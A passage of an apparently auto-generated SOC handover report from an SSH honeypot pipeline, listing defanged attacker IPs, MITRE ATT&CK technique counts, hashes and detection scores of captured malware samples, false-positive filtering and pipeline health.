| `45.148.120[.]187` | 1 | 2026-05-13 05:45 | 2026-05-13 05:46 | 53s | 0 | `T1592` | 🟢 LOW |
| `45.66.131[.]134` | 1 | 2026-05-13 04:03 | 2026-05-13 04:03 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `86.246.231[.]52` | 1 | 2026-05-13 04:52 | 2026-05-13 04:52 | 3s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `86.246.231[.]52` | FR | Orange S.A. | **100** ⚠️ | 15 |
| `1.15.51[.]236` | CN | Tencent cloud computing (Beijing) Co., Ltd. | **100** ⚠️ | 41 |
| `47.84.117[.]117` | SG | Alibaba Cloud LLC | **100** ⚠️ | 15 |
| `190.181.4[.]12` | BO | BIOS SYSTEM SRL | **100** ⚠️ | 50 |
| `223.247.218[.]112` | CN | CHINANET Anhui province network | **100** ⚠️ | 50 |
| `18.119.11[.]223` | US | Amazon Technologies Inc. | **100** ⚠️ | 30 |
| `110.166.87[.]119` | CN | CHINANET Qinghai Province Network | **100** ⚠️ | 50 |
| `122.37.66[.]15` | KR | LG POWERCOMM | **100** ⚠️ | 0 |
| `182.180.59[.]208` | PK | DSLAM Infrastructure South | **100** ⚠️ | 50 |
| `120.48.123[.]76` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 59 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 28 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 27 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 14 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 14 |

---

## 🔕 False Positive Summary (55 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 2 |
| AbuseIPDB score 19 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 47 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 296 cases |
| Tool 34  | Credential Extractor        | ✅ 56 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 38 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 55 filtered (18.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 36 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 28 priority case(s) shown individually · 24 recon entry/entries in table (5 group(s) consolidating 194 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-13T06:52:08Z_
